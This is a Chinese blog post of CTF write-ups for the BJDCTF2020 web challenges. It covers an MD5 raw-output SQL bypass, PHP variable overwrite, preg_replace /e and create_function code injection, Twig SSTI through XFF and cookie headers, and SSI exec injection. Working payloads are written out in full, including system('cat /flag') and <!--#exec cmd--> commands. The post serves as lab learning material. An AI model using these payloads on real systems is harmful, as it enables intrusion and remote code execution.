---
title: BJDCTF2020全家桶
date: 2020-10-01 10:03:08
categories: CTF做题记录
---

<!-- TOC -->

- [[BJDCTF2020]Easy MD5](#bjdctf2020easy-md5)
- [[BJDCTF2020]Mark loves cat](#bjdctf2020mark-loves-cat)
- [[BJDCTF2020]ZJCTF，不过如此](#bjdctf2020zjctf不过如此)
- [[BJDCTF2020]The mystery of ip](#bjdctf2020the-mystery-of-ip)
- [[BJDCTF2020]Cookie is so stable](#bjdctf2020cookie-is-so-stable)
- [[BJDCTF2020]EasySearch](#bjdctf2020easysearch)
- [[BJDCTF2020]EzPHP](#bjdctf2020ezphp)
- [写在最后](#写在最后)

<!-- /TOC -->

<!--more-->
---

# [BJDCTF2020]Easy MD5
>md5(str,true)的绕过：ffifdyop；md5强弱判断的绕过

随便搜了搜没发现啥东西，抓包看看response，这个猛一看还是万能密码，但是后面的password查询加密了，普通的万能密码不能用，这个查询方式在实验吧也有一个，当时直接给了一个能用的payload：`ffifdyop`，这个直接成功了，接下来看看原理
![抓包](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF2020/image.d5njrglf5k9.png)
![done1](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF2020/image.6l1aq9ihj5.png)

原理：md5后面加上true意为返回原始16字符二进制格式\
![md5-true](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF2020/image.qnoq1b13yqc.png)\
再来看看字符串被加密成什么了，可以看到加上true后字符串出现了`'or'6`，这在MySQL查询里可是万能密码啊

![加密](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF2020/image.3qlfnv1bxmd.png)

在mysql里面，在用作布尔型判断时，以数字开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password='xxx' or '1xx'，那么就相当于password='xxx' or 1 ，也就相当于password='xxx' or true，所以返回值就是true
![MySql](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF2020/image.zc8ak1q37d.png)

所以i要'or'后面的字符串为一个非零的数字开头都会返回True，可以用一个脚本来找，脚本引自[这里](http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/)
```php
<?php 
for ($i = 0;;) { 
 for ($c = 0; $c < 1000000; $c++, $i++)
  if (stripos(md5($i, true), '\'or\'') !== false)
   echo("\nmd5($i) = " . md5($i, true) . "\n");
 echo(".");
}
?>
```
输入上述字符串后进入下一关，~~可以发现赵师傅征婚的注释~~，弱判断的md5数组绕过，md5函数不能处理数组，遇到数组时会变成空
payload为`?a[]=&b[]=`
![2nd](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF2020/image.yd1iq3erkml.png)
下一关与上一关的不同就是所有的比较都变成了强比较，不过还是能用数组绕过哈哈哈，其实第二关应该考的是md5碰撞，寻找两个明文相同但加密后都是以`0e`开头的字符串，例如`QNKCDZO`和`s214587387a`
![done](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF2020/image.la7zyjqxrvh.png)

>11.19补，在群里看见有师傅说`e58`也可以过，遂研究一下\
`e58`加密后为乱码，但是中间有`'-'`也就是构造出了`'a'-'b'`，字符串相减为0，然后在与pass比较，大多数密码都是字母开头，也就造成了弱比较，导致密码被转为0在与0比较则为真~~，可以随意登录~~\
附一个优先级\
```

优先级由低到高排列	运算符
1	=(赋值运算）、:=
2	II、OR
3	XOR
4	&&、AND
5	NOT
6	BETWEEN、CASE、WHEN、THEN、ELSE
7	=(比较运算）、<=>、>=、>、<=、<、<>、!=、 IS、LIKE、REGEXP、IN
8	|
9	&
10	<<、>>
11	-(减号）、+
12	*、/、%
13	^
14	-(负号）、〜（位反转）
15	!
```

---
# [BJDCTF2020]Mark loves cat
>git泄露，变量覆盖

网站做的挺精致，转了一圈没发现啥，在contact那有留言框，可能有xss吧，结果并没有可能是太菜了，扫一下看看，git源码泄露，下载下来（这是网上师傅wp的，我的githack又炸了，下不下来。。。）
![dirsearch](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF2020/image.0whio49hlxkn.png)
```php
<?php
include 'flag.php';
$yds = "dog";
$is = "cat";
$handsome = 'yds';

foreach($_POST as $x => $y){
    $$x = $y;
}

foreach($_GET as $x => $y){
    $$x = $$y;
}

foreach($_GET as $x => $y){
    if($_GET['flag'] === $x && $x !== 'flag'){	//GET方式传flag只能传一个flag=flag
        exit($handsome);
    }
}

if(!isset($_GET['flag']) && !isset($_POST['flag'])){	//GET和POST其中之一必须传flag
    exit($yds);
}

if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){	//GET和POST传flag,必须不能是flag=flag
    exit($is);
}

echo "the flag is: ".$flag;
```
payload:
```
GET:yds=flag
POST:$flag=flag
```
![done](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF2020/image.8xz99i9yyqn.png)

---

# [BJDCTF2020]ZJCTF，不过如此
> 伪协议考察，preg_replace /e的RCE

给了源码
```php
<?php
error_reporting(0);
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }

    include($file);  //next.php
    
}
else{
    highlight_file(__FILE__);
}
?>
```
分析一下：

- GET传入text与file两个变量
- text变量内容为`I have a dream`
- file内容不能有`flag`

file_get_contents是读取文件的哦，直接传`text=I have a dream`是没用的，需要用`php://input`或`data://text/plain`这两个伪协议绕过，用第一个的话直接在post里面写上字符串就好；\
file也用伪协议读源码`?text=data://text/plain,I have a dream&file=php://filter/read=convert.base64-encode/resource=next.php`\
读出来的是base64，解码得：
```php
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}


foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
	@eval($_GET['cmd']);
}
```
红日发了一篇文章是preg_replace的RCE，即在preg_replace /e 模式下的代码执行问题。链接：https://xz.aliyun.com/t/2557\
payload：
-  /?.*={${phpinfo()}}
-  \S*=${phpinfo()}
> 在那之前先了解一下什么是preg_replace函数
>> mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit ] )\
在 subject 中搜索 pattern 模式的匹配项并替换为 replacement 。如果指定了 limit ，则仅替换 limit 个匹配，如果省略 limit 或者其值为 -1，则所有的匹配项都会被替换。

>注意：/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误

看看phpinfo：`?\S*=${phpinfo()}`
![phpinfo](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF2020/image.c9uos9d9d3l.png)
最终payload可以使用源码给出的getFlag函数：`?\S*=${getFlag()}&cmd=system("cat /flag");`

---
# [BJDCTF2020]The mystery of ip
> xff的ssti

![index.php](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF2020/image.z9n6ibdos5.png)
在hint页面源码发现
![hint.php](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF2020/image.prf1021bk1b.png)
而在flag.php页面有显示IP，抓包看看，加上XFF试试
![xff](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF2020/image.3kdef6e8e2m.png
)
看了师傅的wp才知道，xff也能ssti，涨知识
![ls](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF2020/image.77hy6rwxkzc.png)
![flag](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF2020/image.6unun59diw6.png)

---
# [BJDCTF2020]Cookie is so stable
> cookie的ssti，ssti使用{{7*'7'}}测试使用框架

这题和上一个差不多，看看hint源码，提示仔细看看cookie
![hint source](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF2020/image.l1a4dmo6n8n.png)
在flag页面有个输入用户名的登录框，也能ssti，但是并不能直接读flag，结合hint应该不是这个地方，去cookie里面找
这里祭出Y1ng师傅的一张图，测试ssti是哪种框架
> ssti主要为python的一些框架jinja2 mako tornado django
> 
![Y1ng](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF2020/image.zk6pdpntzv.png)
测试出是Twig，再贴出来一个网站
[一篇文章带你理解漏洞之 SSTI 漏洞](https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E)\
payload：\
`{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
直接在输入框里面是不行的，在退出登录时cookie出现了user参数，应该就是这可以ssti了
![ssti](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF2020/image.6zkaczjccf2.png)
改成payload
![flag](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF2020/image.htvztgrx10m.png)

---
# [BJDCTF2020]EasySearch
>文件备份，ssi注入

是个登录框，注入没用，源码没东西，御剑扫到一个`index.php.swp`，下载恢复一下
![index.php](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF2020/image.tolty1677d.png)
```php
<?php
        ob_start();
        function get_hash(){
                $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';
                $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
                $content = uniqid().$random;
                return sha1($content);
        }
    header("Content-Type: text/html;charset=utf-8");
        ***
    if(isset($_POST['username']) and $_POST['username'] != '' )
    {
        $admin = '6d0bc1';
        if ( $admin == substr(md5($_POST['password']),0,6)) {
            echo "<script>alert('[+] Welcome to manage system')</script>";
            $file_shtml = "public/".get_hash().".shtml";
            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
            $text = '
            ***
            ***
            <h1>Hello,'.$_POST['username'].'</h1>
            ***
                        ***';
            fwrite($shtml,$text);
            fclose($shtml);
            ***
                        echo "[!] Header  error ...";
        } else {
            echo "<script>alert('[!] Failed')</script>";

    }else
    {
        ***
    }
        ***
?>
```
13、14行代码发现可以暴力出来密码，脚本：
```python
import hashlib

for i in range(10000000):
	a = hashlib.md5(str(i).encode("utf-8")).hexdigest()
	if a[0:6] == '6d0bc1':
		print(i)
		print(a)
```
![passwd](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF2020/image.j8yakv6yf1.png)
登上去发现没啥玩意，看了看bp的site map发现登陆上的时候跳了个页面
![site map](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF2020/image.06bf98sfdoz.png)
![public](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF2020/image.r1fevxt4t0e.png)
这我就不会了，看看师傅的wp吧，~~啥时候能摆脱wp，自己写呢哈哈哈,~~是ssi呢，这可不是前面说的那两种。
>SSI全称是Server Side Includes，即服务器端包含，是一种基于服务器端的网页制作技术\
原理：SSI在HTML文件中，可以通过注释行调用命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码\
>shtml文件（还有stm、shtm文件）就是应用了SSI技术的html文件，所以在.shtml页面返回到客户端前，页面中的SSI指令将被服务器解析\
参考链接：https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/

注入命令：`<!--#exec cmd="命令" -->`
![ls](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF2020/image.e9r9hy96nyd.png)
不在本目录，由于懒省事，没用一层一层翻目录，直接find了，`<!--#exec cmd="find / -name flag*" -->`
![flag*](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF2020/image.9d1kyjpp1tl.png)
尴尬，直接读绝对路径似乎不得行，又看了看pwd才知道，flag在本目录上一层，试试读相对路径，`<!--#exec cmd="cat ../flag_990c66bf85a09c664f0b6741840499b2" -->`，出来了，我也不知道啥原因
![flag](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF2020/image.xkxs7ukqojb.png)

---
# [BJDCTF2020]EzPHP

主页源码发现`GFXEIM3YFZYGQ4A=`，并不是base64，是base32哈哈哈，解码是`1nD3x.php`，进去就是代码审计
```php
 <?php
highlight_file(__FILE__);
error_reporting(0); 

$file = "1nD3x.php";
$shana = $_GET['shana'];
$passwd = $_GET['passwd'];
$arg = '';
$code = '';

echo "<br /><font color=red><B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</B><br></font>";

if($_SERVER) { 
    if (
        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING'])
        )  
        die('You seem to want to do something bad?'); 
}

if (!preg_match('/http|https/i', $_GET['file'])) {
    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { 
        $file = $_GET["file"]; 
        echo "Neeeeee! Good Job!<br>";
    } 
} else die('fxck you! What do you want to do ?!');

if($_REQUEST) { 
    foreach($_REQUEST as $value) { 
        if(preg_match('/[a-zA-Z]/i', $value))  
            die('fxck you! I hate English!'); 
    } 
} 

if (file_get_contents($file) !== 'debu_debu_aqua')
    die("Aqua is the cutest five-year-old child in the world! Isn't it ?<br>");


if ( sha1($shana) === sha1($passwd) && $shana != $passwd ){
    extract($_GET["flag"]);
    echo "Very good! you know my password. But what is flag?<br>";
} else{
    die("fxck you! you don't know my password! And you don't know sha1! why you come here!");
}

if(preg_match('/^[a-z0-9]*$/isD', $code) || 
preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) { 
    die("<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); 
} else { 
    include "flag.php";
    $code('', $arg); 
} ?>
This is a very simple challenge and if you solve it I will give you a flag. Good Luck!
Aqua is the cutest five-year-old child in the world! Isn't it ?
```
啊这，[看看Y1ng大佬的WP吧](https://www.gem-love.com/ctf/770.html)。。。
## 第一个绕过：QUERY_STRING的正则匹配
```php
if($_SERVER) { 
    if (
        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING'])
        )  
        die('You seem to want to do something bad?'); 
}
```
>[了解QUERY_STRING](http://blog.sina.com.cn/s/blog_686999de0100jgda.html)：\
>>1，http://localhost/aaa/ (打开aaa中的index.php)
结果：
\$_SERVER['QUERY_STRING'] = "";\
\$_SERVER['REQUEST_URI'] = "/aaa/";\
\$_SERVER['SCRIPT_NAME'] = "/aaa/index.php";\
\$_SERVER['PHP_SELF'] = "/aaa/index.php";\
\
2，http://localhost/aaa/?p=222 (附带查询)
结果：
\$_SERVER['QUERY_STRING'] = "p=222";\
\$_SERVER['REQUEST_URI'] = "/aaa/?p=222";\
\$_SERVER['SCRIPT_NAME'] = "/aaa/index.php";\
\$_SERVER['PHP_SELF'] = "/aaa/index.php";\
\
3，http://localhost/aaa/index.php?p=222&q=333
结果：
\$_SERVER['QUERY_STRING'] = "p=222&q=333";\
\$_SERVER['REQUEST_URI'] = "/aaa/index.php?p=222&q=333";\
\$_SERVER['SCRIPT_NAME'] = "/aaa/index.php";\
\$_SERVER['PHP_SELF'] = "/aaa/index.php";
>- \$_SERVER["QUERY_STRING"] 获取查询 语句，实例中可知，获取的是?后面的值
>- \$_SERVER["REQUEST_URI"]  获取 http://localhost 后面的值，包括/
>- \$_SERVER["SCRIPT_NAME"]  获取当前脚本的路径，如：index.php
>- \$_SERVER["PHP_SELF"]     当前正在执行脚本的文件名

`$_SERVER['QUERY_STRING']`不会进行URLDecode，而`$_GET[]`会，所以第一关只需要URL编码即可绕过

## 第二个绕过：debu的正则匹配
```php
if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { 
    $file = $_GET["file"]; 
    echo "Neeeeee! Good Job!<br>";
} ;
```
正则里面`^`匹配开始`$`匹配结束，但后面又说不能等于`aqua_is_cute`，对于这种匹配，可以使用`%0a`换行污染字符串，payload：
`?debu=aqua_is_cute%0a`-->编码`?%64%65%62%75=%61%71%75%61%5F%69%73%5F%63%75%74%65%0a`

## 第三个绕过：$_REQUEST的字母匹配
```php
if($_REQUEST) { 
    foreach($_REQUEST as $value) { 
        if(preg_match('/[a-zA-Z]/i', $value))  
            die('fxck you! I hate English!'); 
    } 
} 
```
这段一个一个取出传的变量值，过滤所有英文字符，但是在第二关中我们就必须上传一些字符串，在这却全部被过滤了，在此了解一下`$_REQUEST`的优先级
>`$_REQUEST`可以同时接受GET和POST的数据\
通常`POST`的优先级较高，当然，这也不是绝对的，在php.ini中可以更改，搜索`variables_order`，我的在611-635
```
; This directive determines which super global arrays are registered when PHP
; starts up. G,P,C,E & S are abbreviations for the following respective super
; globals: GET, POST, COOKIE, ENV and SERVER. There is a performance penalty
; paid for the registration of these arrays and because ENV is not as commonly
; used as the others, ENV is not recommended on productions servers. You
; can still get access to the environment variables through getenv() should you
; need to.
; Default Value: "EGPCS"
; Development Value: "GPCS"
; Production Value: "GPCS";
; http://php.net/variables-order
variables_order = "GPCS"

; This directive determines which super global data (G,P,C,E & S) should
; be registered into the super global array REQUEST. If so, it also determines
; the order in which that data is registered. The values for this directive are
; specified in the same manner as the variables_order directive, EXCEPT one.
; Leaving this value empty will cause PHP to use the value set in the
; variables_order directive. It does not mean it will leave the super globals
; array REQUEST empty.
; Default Value: None
; Development Value: "GP"
; Production Value: "GP"
; http://php.net/request-order
request_order = "GP"
```
借用Y1ng的翻译：
>这个指令决定了当PHP启动时注册哪些超全局数组。G,P,C,E,S分别是以下超全局数组的缩写：GET, POST, COOKIE, ENV, SERVER. 注册这些数组需要在性能上付出代价，而且因为ENV不像其他的那样通用，不推荐将ENV用在生产服务器上。如果需要的话，你仍然可以通过getenv()来访问这些环境变量。\
默认的优先级ENV<GET<POST<COOKIE<SERVER
\
variables_order = “GPCS”
\
\
此指令确定哪些超级全局数据（G P C）应注册到超级全局数组REQUEST中。如果是这样，它还决定了数据注册的顺序。此指令的值以与variables_order指令相同的方式指定，只有一个除外。将此值保留为空将导致PHP使用variables order指令中设置的值。这并不意味着它会让super globals数组请求为空。\
request的顺序：GET<POST
\
request_order = “GP”

所以只需要同时POST一个数字即可，payload：`GET：?debu=aqua_is_cute%0a`，`POST：debu=1`-->编码`GET：?%64%65%62%75=%61%71%75%61%5F%69%73%5F%63%75%74%65%0a`，`POST：debu=1`

## 第四个绕过：文件内容读取的比较
```php
if (!preg_match('/http|https/i', $_GET['file'])) {
    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { 
        $file = $_GET["file"]; 
        echo "Neeeeee! Good Job!<br>";
    } 
} else die('fxck you! What do you want to do ?!');
if (file_get_contents($file) !== 'debu_debu_aqua')
    die("Aqua is the cutest five-year-old child in the world! Isn't it ?<br>");
```
匹配了`http|https`说明不能通过外部包含文件，不过可以用伪协议`data://text/plain`，不能用`php://input`哦，因为上一关还在限制不能出现字母，所以要POST一个数字的，再加上第一关的限制，需要URL编码（注意编码后是否还含有第一关过滤的字符，如果有，再次编码），此时payload：`GET：?debu=aqua_is_cute%0a&file=data://text/plain,debu_debu_aqua`，`POST：debu=1&file=1`-->编码：`GET：?%64%65%62%75=%61%71%75%61%5F%69%73%5F%63%75%74%65%0a&%66%69%6C%65=%64%61%74%61%3A%2F%2F%74%65%78%74%2F%70%6C%61%69%6E%2C%64%65%62%75%5F%64%65%62%75%5F%61%71%75%61`，`POST：debu=1&file=1`

## 第五个绕过：sha1比较
```php
if( sha1($shana) === sha1($passwd) && $shana != $passwd ){
    extract($_GET["flag"]);
    echo "Very good! you know my password. But what is flag?<br>";
} else{
    die("fxck you! you don't know my password! And you don't know sha1! why you come here!");
}
```
sha1和ma5“一样”，都不能处理数组，所以直接传两个数组就好（sha1处理数组会返回False，两个False就是相等的啦），此时payload：`shana[]=1&passwd[]=2`-->第一关需要编码`%73%68%61%6e%61[]=1&%70%61%73%73%77%64[]=2`

## （划重点）第六个绕过：create_function()代码注入
```php
$arg = '';
$code = '';
if(preg_match('/^[a-z0-9]*$/isD', $code) || 
preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) { 
    die("<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); 
} else { 
    include "flag.php";
    $code('', $arg); 
}
```
最后这个`$code('', $arg);`不明所以，直接Google可以知道是`create_function()`
![create_function](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF2020/image.zt0cqe76xe.png)
>介绍一下create_function()\
此函数用于创建一个lambda样式的函数\
string create_function(string $args, string $code)\
string $args 变量部分\
string $code 方法代码部分\
官方举例：
>```php
><?php
>$newfunc = create_function('$a,$b', 'return "ln($a) + ln($b) = " . log($a * $b);');
>echo "New anonymous function: $newfunc";
>echo $newfunc(2, M_E) . "
>";
>// outputs
>// New anonymous function: lambda_1
>// ln(2) + ln(2.718281828459) = 1.6931471805599
>?>
>```

如果第二个参数`$code`无限制，就会导致代码注入。
```php
//简单例子
$myfunc = create_function('$a, $b', 'return $a+$b;');
//相当于
function myFunc($a, $b){
	return $a+$b;
}
//注入示例代码
$code=return $a+$b;}eval($_POST['yq1ng']);//
//结果
function myfunc($a, $b){
    return $a+$b;
}
eval($_POST['yq1ng']);//}  
```
通过手工闭合花括号}并注释掉最后的括号就可以达到代码注入的目的，在上一关中有`extract($_GET["flag"]);`代码，借助这个可以进行变量覆盖，payload：`flag[code]=create_function&flag[arg]=}xxx();//`，以此来执行`xxx()`\
执行啥呢？直接读源码吗，被ban了，仔细看看，包含了flag.php，可能里面有需要的变量？那有没有一个函数可以把脚本里的变量全部打印出来呢？\
当然！`get_defined_vars()`可以用来输出所有变量和值！payload：`flag[code]=create_function&flag[arg]=}var_dump(get_defined_vars());//`\
完整payload：`GET：1nD3x.php?%64%65%62%75=%61%71%75%61%5F%69%73%5F%63%75%74%65%0a&%66%69%6C%65=%64%61%74%61%3A%2F%2F%74%65%78%74%2F%70%6C%61%69%6E%2C%64%65%62%75%5F%64%65%62%75%5F%61%71%75%61&%73%68%61%6e%61[]=1&%70%61%73%73%77%64[]=2&%66%6C%61%67%5B%63%6F%64%65%5D=%63%72%65%61%74%65%5F%66%75%6E%63%74%69%6F%6E&%66%6C%61%67%5B%61%72%67%5D=}var_dump(get_defined_vars());//`，`POST：debu=1&file=1`
![rea1fl4g.php](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF2020/image.picp6yp3emp.png)
找到真的flag了，怎么读取呢?过滤了读取命令、单双引号和flag，但是还能用`require`去代替`include`，flag用base64编码，将刚才的var_dump换成`require(base64_decode(cmVhMWZsNGcucGhw));`，在进行编码payload：`%72%65%71%75%69%72%65%28%62%61%73%65%36%34%5F%64%65%63%6F%64%65%28%63%6D%56%68%4D%57%5A%73%4E%47%63%75%63%47%68%77%29%29%3B`
![fake_flag](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF2020/image.865tl87ufs8.png)\
读读源码试试：`require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php);`但是这样并不能读取成功，编码上传后，在最后一处限制解码了，并过滤了伪协议，不行
![false](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF2020/image.8jf53s1hkq.png)
不过这里可以进行取反操作来绕过，payload：`require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));`
```php
借一下Y1ng师傅的脚本
<?php
$a = "p h p : / / f i l t e r / r e a d = c o n v e r t . b a s e 6 4 - e n c o d e / r e s o u r c e = r e a 1 f l 4 g . p h p";
$arr1 = explode(' ', $a);
echo "<br>~(";
foreach ($arr1 as $key => $value) {
	echo "%".bin2hex(~$value);
}
echo ")<br>";
```
所以最终payload：`1nD3x.php?%64%65%62%75=%61%71%75%61%5F%69%73%5F%63%75%74%65%0a&%66%69%6C%65=%64%61%74%61%3A%2F%2F%74%65%78%74%2F%70%6C%61%69%6E%2C%64%65%62%75%5F%64%65%62%75%5F%61%71%75%61&%73%68%61%6e%61[]=1&%70%61%73%73%77%64[]=2&%66%6C%61%67%5B%63%6F%64%65%5D=%63%72%65%61%74%65%5F%66%75%6E%63%74%69%6F%6E&%66%6C%61%67%5B%61%72%67%5D=}require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));//`
![done](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF2020/image.231la7v32wt.png)
base64解码
![flag](https://raw.githubusercontent.com/yq1ng/blog/master/BJDCTF2020/image.pn3zf20v5bd.png)

# 写在最后
这次的复现真的学到不少东西，同时也发现自己菜的不行，以前知道的许多东西和题目都联系不起来，比如最后一题过滤了那么多参数，我都没想到用无参RCE，虽然也用不了吧，现在还只是看着WP才能过日子，希望能早日摆脱这种依赖，加油!\
\
不登高山，不知天之高也;不临深溪，不知地之厚也。 --《荀子》